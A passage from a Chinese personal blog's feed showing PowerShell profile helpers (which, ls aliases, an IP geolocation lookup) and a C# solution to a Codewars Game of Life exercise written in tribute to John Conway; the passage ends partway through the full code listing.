</span></span><span style="display:flex;"><span>    wsl -d debian -e nvim $Path
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="which">which</h2>
<p>获取某个可执行文件的路径。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> which {
</span></span><span style="display:flex;"><span>    $results = New-Object System.Collections.Generic.List[<span style="color:#66d9ef">System.Object</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">foreach</span> ($command <span style="color:#66d9ef">in</span> $args) {
</span></span><span style="display:flex;"><span>        $path = (Get-Command $command).Source
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($path) {
</span></span><span style="display:flex;"><span>            $results.Add($path);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $results;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="ls">ls</h2>
<p>*nix 中的 <code>ls</code> 样式，可惜没搞出来着色。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> ListDirectory {
</span></span><span style="display:flex;"><span>    Get-ChildItem $args | Format-Wide Name -AutoSize
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Set-Alias -Name ls -Value ListDirectory
</span></span><span style="display:flex;"><span>Set-Alias -Name ll -Value Get-ChildItem
</span></span><span style="display:flex;"><span>Set-Alias -Name l -Value Get-ChildItem
</span></span></code></pre></div><p>related: <a href="https://github.com/JRJurman/PowerLS">powerls</a></p>
<h2 id="nali">nali</h2>
<p>接收一个域名或 ip（<code>-Query</code>），返回其 ip 和地理位置信息。</p>
<p>默认是获取本地的 ip 和位置，语言可以切换英文或中文（默认是中文）。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> nali {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">param</span> (
</span></span><span style="display:flex;"><span>        $Query = <span style="color:#e6db74">&#39;&#39;</span>,
</span></span><span style="display:flex;"><span>        [Alias(<span style="color:#e6db74">&#39;l&#39;</span>)]
</span></span><span style="display:flex;"><span>        $Lang = <span style="color:#e6db74">&#39;zh&#39;</span>
</span></span><span style="display:flex;"><span>    )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($Lang.ToLower() <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#39;en&#39;</span> ) {
</span></span><span style="display:flex;"><span>        $Lang = <span style="color:#e6db74">&#39;en&#39;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        $Lang = <span style="color:#e6db74">&#39;zh-CN&#39;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $ApiUrl = <span style="color:#e6db74">&#34;http://ip-api.com/json/{0}?lang={1}&#34;</span> <span style="color:#f92672">-f</span> $Query, $Lang
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $info = (Invoke-WebRequest $ApiUrl).Content | ConvertFrom-Json
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $printInfo = <span style="color:#e6db74">&#34;{0}</span><span style="color:#ae81ff">`t</span><span style="color:#e6db74">[{1} @ {2}, {3}]&#34;</span> <span style="color:#f92672">-f</span> $info.query, $info.isp, $info.city, $info.country
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $printInfo
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>related: <a href="https://github.com/batkiz/nali-go">batkiz/nali-go</a></p>
]]></content><category scheme="https://blog.batkiz.com/tags/powershell" term="powershell" label="powershell"/></entry><entry><title type="html">Conway's Game of Life</title><link href="https://blog.batkiz.com/posts/conways-game-of-life/?utm_source=atom_feed" rel="alternate" type="text/html"/><link href="https://blog.batkiz.com/posts/set-hugo-aliases-with-csharp/?utm_source=atom_feed" rel="related" type="text/html" title="用 C# 设置 Hugo Aliases"/><id>https://blog.batkiz.com/posts/conways-game-of-life/</id><published>2020-04-17T20:55:58+08:00</published><updated>2020-04-17T20:55:58+08:00</updated><content type="html"><![CDATA[<p>R.I.P John Conway.</p>
<p>由于近期席卷全球的新冠肺炎，John Conway 不幸染病离世。生命游戏 (Game of Life) 是其最为著名的成果。几天前我在 Codewars 上刷到了相关的题目，花了一段时间做了出来，在此写一篇文章，就当是为了纪念 Conway 吧。</p>
<h2 id="题目">题目</h2>
<p>Given a 2D array and a number of generations, compute n timesteps of <a href="http://en.wikipedia.org/wiki/Conway%27s_Game_of_Life">Conway&rsquo;s Game of Life</a>.</p>
<p>The rules of the game are:</p>
<ol>
<li>Any live cell with fewer than two live neighbours dies, as if caused by underpopulation.</li>
<li>Any live cell with more than three live neighbours dies, as if by overcrowding.</li>
<li>Any live cell with two or three live neighbours lives on to the next generation.</li>
<li>Any dead cell with exactly three live neighbours becomes a live cell.</li>
</ol>
<p>Each cell&rsquo;s neighborhood is the 8 cells immediately around it (i.e. <a href="https://en.wikipedia.org/wiki/Moore_neighborhood">Moore Neighborhood</a>). The universe is infinite in both the x and y dimensions and all cells are initially dead - except for those specified in the arguments. The return value should be a 2d array cropped around all of the living cells. (If there are no living cells, then return <code>[[]]</code>.)</p>
<p>题目其实就是生命游戏的定义：</p>
<p>在一个无限大的棋盘上，我们以 <code>1</code> 代表存活的生命，以 <code>0</code> 代表死去的生命或 <code>无</code>。</p>
<p>其上的生命遵循上面的四条规则存活、死去、或是产生下一代。</p>
<h2 id="思路">思路</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cs" data-lang="cs"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span>[,] GetGeneration(<span style="color:#66d9ef">int</span>[,] cells, <span style="color:#66d9ef">int</span> generation)
</span></span></code></pre></div><p>可以看到函数接收了二维数组与一个整数，分别代表了其上的生命与要演化的代数。</p>
<p>首先我们要认识清楚，棋盘的大小是<strong>无限的</strong>，而不仅仅是接收的二维数组的大小。当然，题中也给出了计算邻居的规则，我们在处理时，要将接收到的数组扩大一圈。</p>
<p>新建一个长宽各自 +2 的矩形，再把目前的矩形放在其正中间，最后返回这个矩形。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cs" data-lang="cs"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span>[,] NewBoard(<span style="color:#66d9ef">int</span>[,] cells)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> hang = cells.GetLength(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> lie = cells.GetLength(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> newBoard = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">int</span>[hang + <span style="color:#ae81ff">2</span>, lie + <span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; hang + <span style="color:#ae81ff">2</span>; i++)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = <span style="color:#ae81ff">0</span>; j &lt; lie + <span style="color:#ae81ff">2</span>; j++)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            newBoard[i, j] = <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">1</span>; i &lt; hang + <span style="color:#ae81ff">1</span>; i++)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = <span style="color:#ae81ff">1</span>; j &lt; lie + <span style="color:#ae81ff">1</span>; j++)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            newBoard[i, j] = cells[i - <span style="color:#ae81ff">1</span>, j - <span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> newBoard;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>相应的，在返回最终的结果时，棋盘除了有生命存在的一个矩形之外，也要裁剪掉多出的全为 0 的行与列。</p>
<p>这里是分别从上下、左右遍历了数组，获取了其存在 1 的最外层的坐标，然后把它裁剪了下来，返回了最精简的数组。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cs" data-lang="cs"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span>[,] cropped(<span style="color:#66d9ef">int</span>[,] cells)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> hang = cells.GetLength(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> lie = cells.GetLength(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> (hStart, lStart, hEnd, lEnd, hLen, lLen) = (<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; hang; i++)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = <span style="color:#ae81ff">0</span>; j &lt; lie; j++)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (cells[i, j] != <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>                hStart = i;
</span></span><span style="display:flex;"><span>                i = hang;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = hang - <span style="color:#ae81ff">1</span>; i &gt;= <span style="color:#ae81ff">0</span>; i--)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = lie - <span style="color:#ae81ff">1</span>; j &gt;= <span style="color:#ae81ff">0</span>; j--)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (cells[i, j] != <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>                hEnd = i;
</span></span><span style="display:flex;"><span>                i = <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; lie; i++)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = <span style="color:#ae81ff">0</span>; j &lt; hang; j++)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (cells[j, i] != <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>                lStart = i;
</span></span><span style="display:flex;"><span>                i = lie;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = lie - <span style="color:#ae81ff">1</span>; i &gt;= <span style="color:#ae81ff">0</span>; i--)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = hang - <span style="color:#ae81ff">1</span>; j &gt;= <span style="color:#ae81ff">0</span>; j--)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (cells[j, i] != <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>                lEnd = i;
</span></span><span style="display:flex;"><span>                i = <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    hLen = hEnd - hStart + <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    lLen = lEnd - lStart + <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> newCell = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">int</span>[hLen, lLen];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; hLen; i++)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = <span style="color:#ae81ff">0</span>; j &lt; lLen; j++)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            newCell[i, j] = cells[hStart + i, lStart + j];
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> newCell;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>确定了最先与最后的步骤，就要处理中间的过程了。</p>
<p>为了确定某一个坐标下的生物在下一轮中是死是活，只需要获取它有多少存活的邻居，再用给出的四条规则来判定就能得出了。</p>
<p>首先是获取某一特定坐标的生物有多少活着的邻居，仅需遍历它八个邻居的位置并确定是否存活即可。值得注意的是，对于最外层、邻居不足八个的生物要做特殊的处理，以防数组越界。由于我懒得确定是否越界，就用了一个邪道玩法，如果出现了数组越界的 Exception 就忽略掉它继续访问下一个地址。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cs" data-lang="cs"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> GetLiveNeighbors(<span style="color:#66d9ef">int</span> x, <span style="color:#66d9ef">int</span> y, <span style="color:#66d9ef">int</span>[,] ceil)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> val = <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>[] neighbors = { <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, -<span style="color:#ae81ff">1</span> };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; <span style="color:#ae81ff">3</span>; i++)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = <span style="color:#ae81ff">0</span>; j &lt; <span style="color:#ae81ff">3</span>; j++)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (!(neighbors[i] == <span style="color:#ae81ff">0</span> &amp;&amp; neighbors[j] == <span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">int</span> r = (x + neighbors[i]);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">int</span> c = (y + neighbors[j]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">try</span>
</span></span><span style="display:flex;"><span>                {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (ceil[r, c] == <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>                    {
</span></span><span style="display:flex;"><span>                        val += <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">catch</span> (System.Exception)
</span></span><span style="display:flex;"><span>                {
</span></span><span style="display:flex;"><span>                    val += <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> val;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>下面则是确定某一坐标下的生物在下一轮中是死是活。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cs" data-lang="cs"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> hang = cells.GetLength(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> lie = cells.GetLength(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> newGen = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">int</span>[hang + <span style="color:#ae81ff">2</span>, lie + <span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> biggerCells = NewBoard(cells);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> x = <span style="color:#ae81ff">0</span>; x &lt; hang + <span style="color:#ae81ff">2</span>; x++)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> y = <span style="color:#ae81ff">0</span>; y &lt; lie + <span style="color:#ae81ff">2</span>; y++)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> n = GetLiveNeighbors(x, y, biggerCells);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> c = biggerCells[x, y];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        newGen[x, y] = ((c == <span style="color:#ae81ff">1</span>) &amp;&amp; (n == <span style="color:#ae81ff">2</span> || n == <span style="color:#ae81ff">3</span>) || (c == <span style="color:#ae81ff">0</span>) &amp;&amp; n == <span style="color:#ae81ff">3</span>) ? <span style="color:#ae81ff">1</span> : <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> result = cropped(newGen);
</span></span></code></pre></div><p>至于代数，一个递归就能解决问题了。在此不作赘述。</p>
<h2 id="完整代码">完整代码</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cs" data-lang="cs"><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Linq;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ConwayLife</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span>[,] GetGeneration(<span style="color:#66d9ef">int</span>[,] cells, <span style="color:#66d9ef">int</span> generation)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (generation &lt;= <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> cells;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> hang = cells.GetLength(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> lie = cells.GetLength(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> newGen = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">int</span>[hang + <span style="color:#ae81ff">2</span>, lie + <span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> biggerCells = NewBoard(cells);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> x = <span style="color:#ae81ff">0</span>; x &lt; hang + <span style="color:#ae81ff">2</span>; x++)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> y = <span style="color:#ae81ff">0</span>; y &lt; lie + <span style="color:#ae81ff">2</span>; y++)
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">var</span> n = GetLiveNeighbors(x, y, biggerCells);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">var</span> c = biggerCells[x, y];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                newGen[x, y] = ((c == <span style="color:#ae81ff">1</span>) &amp;&amp; (n == <span style="color:#ae81ff">2</span> || n == <span style="color:#ae81ff">3</span>) || (c == <span style="color:#ae81ff">0</span>) &amp;&amp; n == <span style="color:#ae81ff">3</span>) ? <span style="color:#ae81ff">1</span> : <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> result = cropped(newGen);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> GetGeneration(result, generation - <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> GetLiveNeighbors(<span style="color:#66d9ef">int</span> x, <span style="color:#66d9ef">int</span> y, <span style="color:#66d9ef">int</span>[,] ceil)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> val = <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span>[] neighbors = { <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, -<span style="color:#ae81ff">1</span> };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; <span style="color:#ae81ff">3</span>; i++)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = <span style="color:#ae81ff">0</span>; j &lt; <span style="color:#ae81ff">3</span>; j++)
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (!(neighbors[i] == <span style="color:#ae81ff">0</span> &amp;&amp; neighbors[j] == <span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span>                {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">int</span> r = (x + neighbors[i]);
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">int</span> c = (y + neighbors[j]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">try</span>
</span></span><span style="display:flex;"><span>                    {
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span> (ceil[r, c] == <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>                        {
</span></span><span style="display:flex;"><span>                            val += <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                        }
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">catch</span> (System.Exception)
</span></span><span style="display:flex;"><span>                    {
</span></span><span style="display:flex;"><span>                        val += <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> val;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span>[,] cropped(<span style="color:#66d9ef">int</span>[,] cells)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> hang = cells.GetLength(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> lie = cells.GetLength(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> (hStart, lStart, hEnd, lEnd, hLen, lLen) = (<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; hang; i++)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = <span style="color:#ae81ff">0</span>; j &lt; lie; j++)
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (cells[i, j] != <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>                {
</span></span><span style="display:flex;"><span>                    hStart = i;
</span></span><span style="display:flex;"><span>                    i = hang;
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = hang - <span style="color:#ae81ff">1</span>; i &gt;= <span style="color:#ae81ff">0</span>; i--)
</span></span><span style="display:flex;"><span>        {
